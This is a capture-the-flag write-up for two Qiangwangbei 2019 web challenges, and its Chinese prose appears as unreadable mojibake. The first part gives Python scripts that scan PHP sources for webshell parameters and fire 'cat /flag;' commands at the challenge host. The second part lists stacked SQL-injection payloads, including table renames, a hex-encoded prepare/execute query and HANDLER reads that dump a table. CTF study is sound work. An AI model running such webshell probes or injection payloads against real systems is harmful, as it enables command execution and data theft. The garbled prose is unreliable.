## [å¼ºç½‘æ¯ 2019]é«˜æ˜çš„é»‘å®¢

+++

è¿™é¢˜åœ¨buuä¸Šåšå®åœ¨æ˜¯å¤ªæŠ˜ç£¨äººğŸŒ¶
buuä¸Šçš„ç¯å¢ƒæ‰«æå¿«äº†å°±æŠ¥429ï¼Œè€Œè¿™é¢˜ä¿å®ˆä¼°è®¡æœ‰å‡ ä¸‡æ¡æ•°æ®è¦å¤„ç†ï¼Œå‡è®¾æˆ‘ä¸€ç§’10æ¡ï¼Œä¹Ÿè¦ä¸¤ä¸‰ä¸ªå°æ—¶
æ‰“å¼€æœ¬é¢˜æºç çš„æ—¶å€™æˆ‘æ˜¯æ‡µçš„ï¼Œå‡ åƒä¸ªæ–‡ä»¶ï¼Œç„¶åæœäº†ä¸€ä¸‹**eval**ï¼Œå…¶å®ä¹Ÿå°±å‡ åƒä¸ª
è¿™ä¸ªæ—¶å€™æˆ‘è¿˜æ˜¯å¾ˆæœ‰ä¿¡å¿ƒçš„ï¼Œå°±æ˜¯æ‰¾åˆ°æ–‡ä»¶é‡Œçš„æ‰€æœ‰é©¬ç„¶åä¸€ä¸ªä¸ªè¯•ï¼Œçœ‹å“ªä¸ªèƒ½ç”¨å˜›

ç”¨æˆ‘çš„çƒ‚pythonå†™äº†ä¸€ä¸ªçƒ‚è„šæœ¬(å†™äº†å¾ˆä¹…å¾ˆä¹…å¾ˆä¹…)

```python
import sys
import os
import re
from turtle import st
import requests
import time

path=r"E:\phpstudy_pro\WWW\test\src"
print(path)
files=os.listdir(path)  #å¾—åˆ°æ‰€æœ‰æ–‡ä»¶åè¾“å‡ºåˆ°ä¸€ä¸ªè¡¨é‡Œé¢
url='http://2fd5d67b-3795-4fd9-a545-d7dc79a145ff.node4.buuoj.cn:81/'

for file in files:
    f=open(path+"\\"+file,"r")
    text=f.readlines()
    f.close()
    #print(text)
    for line in text:
        start1=line.find("$_GET[")#å¼€å§‹åªæ‰¾äº†åŒ…å«evalçš„
        if start1!=-1:
            #print(line)
            end=line.find("']")
            php=r'=cat /flag;'
            #print(line[start1+12:end])
            GET=file+'?'+line[start1+7:end]+php
            time.sleep(0.05)
            r=requests.get(url+GET)
            if('flag'in r.text):
                print(line)
                print(GET)
                exit('you get the flag!!!')
                print(r.text)
            else :
                print('no')
                print(url+GET)
        start2=line.find("$_POST[")
        if start2!=-1:
            #print(line)
            end=line.find("']")
            POST=line[start2+8:end]
            data={f'{POST}':'cat /flag;'}
            time.sleep(0.05)
            r=requests.post(url=url+file,data=data)
            if('flag'in r.text):
                print(line)
                print('you get the flag!!!')
                exit(0)
            else :
                print('no')
                print(url+POST)
```

ç„¶åè·‘äº†åå‡ åˆ†é’Ÿå°±è·‘å®Œäº†ï¼Œä»€ä¹ˆä¹Ÿæ²¡æœ‰

åœ¨æˆ‘æµ‹è¯•äº†è®¸ä¹…ç¡®å®šæˆ‘çš„è„šæœ¬æ²¡æœ‰é—®é¢˜ä¹‹åï¼Œå°±å»çœ‹äº†WP
åŸæ¥é¢˜ç›®çš„æ„æ€æ˜¯ï¼Œåªè¦æœ‰`$_GET`æˆ–è€…`$_POST`çš„éƒ½ç®—é©¬
ä¸Šé¢çš„è„šæœ¬å°±æ˜¯æŒ‰è¿™ä¸ªæ¥çš„ï¼Œä¹Ÿå°±æ˜¯æŒ‰è¿™æ ·æ¥çš„è¯ï¼Œæˆ‘è·‘åˆ°ç¯å¢ƒç»“æŸä¹Ÿè·‘ä¸å‡ºæ¥
å°±ç›´æ¥çœ‹äº†æ˜¯å“ªä¸ªæ–‡ä»¶çš„é©¬ï¼Œå•ç‹¬æµ‹è¯•äº†ä¸€ä¸‹å‘ç°è„šæœ¬æ²¡é—®é¢˜å°±ğŸ†—äº†
è´´ä¸€ä¸ªå¤§ä½¬çš„å·¨å¿«é€Ÿè„šæœ¬ï¼Œè¦æ˜¯æ²¡æœ‰429å°±å¥½äº†ğŸ˜«

```python
import requests
import os
import re
import threading
import time

session = requests.Session()   
session.keep_alive = False  # requestsé»˜è®¤ä½¿ç”¨urllib3åº“ï¼Œé»˜è®¤æ˜¯é•¿è¿æ¥ï¼Œæ”¹ä¸ºfalse,å…³é—­å¤šä½™çš„è¿æ¥
requests.adapters.DEFAULT_RETRIES = 8  # è®¾ç½®é‡è¿æ¬¡æ•°ï¼Œé˜²æ­¢çº¿ç¨‹æ•°è¿‡é«˜ï¼Œæ–­å¼€è¿æ¥
sem = threading.Semaphore(30)  # è®¾ç½®æœ€å¤§çº¿ç¨‹æ•° ,åˆ«è®¾ç½®å¤ªå¤§ï¼Œä¸ç„¶è¿˜æ˜¯ä¼šå´©çš„æŒºå‰å®³çš„ï¼Œè·‘åˆ°å…³é”®çš„çˆ†ç‚¸ï¼Œå¿ƒæ€å°±çˆ†ç‚¸äº†

url = "http://2fd5d67b-3795-4fd9-a545-d7dc79a145ff.node4.buuoj.cn:81/"


path = r"E:\phpstudy_pro\WWW\test\src"+"\\"

rrGET = re.compile(r"\$_GET\[\'(\w+)\'\]")  # åŒ¹é…getå‚æ•°ï¼Œw åŒ¹é…ä»»ä½•å­—æ¯å’Œæ•°å­—è¿˜æœ‰ä¸‹åˆ’çº¿ï¼Œ+ åŒ¹é…+ä¹‹å‰çš„1æ¬¡æˆ–å¤šæ¬¡

rrPOST = re.compile(r"\$_POST\[\'(\w+)\'\]")  # åŒ¹é…postå‚æ•°

fileNames = os.listdir(path)  # åˆ—å‡ºç›®å½•ä¸­çš„æ–‡ä»¶,ä»¥æ¯ä¸ªæ–‡ä»¶éƒ½å¼€ä¸€ä¸ªçº¿ç¨‹

flags = []  # ç”¨äºå­˜æ‰€æœ‰çš„æ³¨å…¥ç‚¹ä¿¡æ¯,ä¸‹é¢çš„flagè¡¨ç¤ºæ³¨å…¥ç‚¹çš„ä¿¡æ¯ï¼Œphpæ–‡ä»¶åå’Œå‚æ•°å

local_file = open("flag.txt", "w", encoding="utf-8")


def run(fileName):
    with sem:
        file = open(path + fileName, 'r', encoding='utf-8')
        content = file.read()
        print("[+]checking:%s" % fileName)
        # æµ‹è¯•getçš„å‚æ•°
        for i in rrGET.findall(content):
            r = session.get(url + "%s?%s=%s" % (fileName, i, "echo 'h3zh1';"))
            print(url + "%s?%s=%s" % (fileName, i, "echo h3zh1;"))
            if "h3zh1" in r.text:
                flag = "You Find it in GET fileName = %s and param = %s \n" % (fileName, i)
                print(flag)
                local_file.write(flag)
                exit(0)
        # return
    # æµ‹è¯•postçš„å‚æ•°
    # for i in rrPOST.findall(content):
    #     r = session.post( url + fileName , data = { i : "echo h3zh1;" } )
    #     if "h3zh1" in r.text:
    #         flag = "You Find it in POST: fileName = %s and param = %s \n" % ( fileName, i )
    #         print(flag)
    #         local_file.writelines(flag)

if __name__ == '__main__':
    start_time = time.time()  # å¼€å§‹æ—¶é—´
    print("[start]ç¨‹åºå¼€å§‹:" + str(start_time))
    thread_list = []
    for fileName in fileNames:
        t = threading.Thread(target=run, args=(fileName,))
        thread_list.append(t)
    for t in thread_list:
        t.start()
    for t in thread_list:
        t.join()
    end_time = time.time()
    local_file.close()  # å…³æ–‡ä»¶
    print("[end]ç¨‹åºç»“æŸ:ç”¨æ—¶:" + str(end_time - start_time))

```

ç„¶åè‡ªå·±æ­äº†è¿™é¢˜çš„ç¯å¢ƒï¼Œç”¨å¤§ç¥çš„è„šæœ¬è¿‡äº†ä¸‹ç˜¾

![image-20220728013239937](D:\Typora\note\CTF\web\å¼ºç½‘æ¯.assets\image-20220728013239937.png)

è¿‡æ­ç¯å¢ƒçš„ç˜¾å’Œçœ‹è„šæœ¬é£é€Ÿè¿è¡Œçš„ç˜¾

+++

## [å¼ºç½‘æ¯ 2019]éšä¾¿æ³¨(æœ‰æ„æ€çš„æ€è·¯å’Œæ–¹æ³•)

+++

`1' or 1=1;#`  è¯æ˜å­˜åœ¨sqlæ³¨å…¥

![image-20220519224923311](D:\Typora\note\CTF\web\å¼ºç½‘æ¯.assets\image-20220519224923311.png)

éšä¾¿è¾“ä¸ªselect

![image-20220519225157158](D:\Typora\note\CTF\web\å¼ºç½‘æ¯.assets\image-20220519225157158.png)

çœ‹è§äº†æ­£åˆ™åŒ¹é…çš„å­—ç¬¦

ç”±äºselectä¸èƒ½ç”¨äº†ï¼Œäºæ˜¯æƒ³åˆ°ç”¨tableä»£æ›¿ï¼Œä½†æŸ¥æ•°æ®åº“ç‰ˆæœ¬å‘ç°ä¸º10ï¼Œç”¨ä¸äº†table

äºæ˜¯è¯•è¯•è”åˆæ³¨å…¥

![image-20220519225848310](D:\Typora\note\CTF\web\å¼ºç½‘æ¯.assets\image-20220519225848310.png)

æ³¨å‡ºåˆ—å

```mysql
1';show columns from `1919810931114514`;#
```

<font color='blured'>çº¯æ•°å­—çš„è¡¨å¿…é¡»å¸¦ä¸Šåå¼•å·!!!</font>

![image-20220519230109408](D:\Typora\note\CTF\web\å¼ºç½‘æ¯.assets\image-20220519230109408.png)

![image-20220519230908651](D:\Typora\note\CTF\web\å¼ºç½‘æ¯.assets\image-20220519230908651.png)

è”åˆæ³¨å…¥å¯ä»¥ï¼Œç»•è¿‡çš„<font color='pink'>éªš</font>å§¿åŠ¿å°±å¤šäº†

#### è§£æ³•â‘ 

1.é€šè¿‡ rename å…ˆæŠŠ words è¡¨æ”¹åä¸ºå…¶ä»–çš„è¡¨åã€‚

2.æŠŠ 1919810931114514 è¡¨çš„åå­—æ”¹ä¸º words ã€‚

3 .ç»™æ–° words è¡¨æ·»åŠ æ–°çš„åˆ—å id ã€‚

4.å°† flag æ”¹åä¸º data ã€‚

```mysql
1'; rename table words to word1; rename table `1919810931114514` to words;alter table words add id int unsigned not Null auto_increment primary key; alert table words change flag data varchar(100);#
```

ç„¶åè¾“å…¥1å°±å¯æŸ¥åˆ°flag

#### è§£æ³•â‘¡

å°†select * from ` `1919810931114514` `è¿›è¡Œ16è¿›åˆ¶ç¼–ç 

æ„é€ payload

```mysql
1;SeT@a=0x73656c656374202a2066726f6d20603139313938313039333131313435313460;prepare execsql from @a;execute execsql;#
```

* prepareâ€¦fromâ€¦æ˜¯é¢„å¤„ç†è¯­å¥ï¼Œä¼šè¿›è¡Œç¼–ç è½¬æ¢
* executeç”¨æ¥æ‰§è¡Œç”±SQLPrepareåˆ›å»ºçš„SQLè¯­å¥
* SELECTå¯ä»¥åœ¨ä¸€æ¡è¯­å¥é‡Œå¯¹å¤šä¸ªå˜é‡åŒæ—¶èµ‹å€¼,è€ŒSETåªèƒ½ä¸€æ¬¡å¯¹ä¸€ä¸ªå˜é‡èµ‹å€¼

#### è§£æ³•â‘¢

ç±»ä¼¼äº[GYCTF2020]Blacklist

ä½¿ç”¨äº†handler

ç›´æ¥ä¸Špayload

```mysql
1'; handler `1919810931114514` open as `a`; handler `a` read next;#
1';handler `1919810931114514` open; handler `1919810931114514` read first;handler `1919810931114514` close;#
1'; handler `1919810931114514` open; handler `1919810931114514` read next;#
```

ä¸‰ç§æ–¹æ³•å®é™…ä¸Šä¸€æ¨¡ä¸€æ ·

æ‰“å¼€æ–‡ä»¶ï¼ŒæŸ¥çœ‹æ–‡ä»¶~
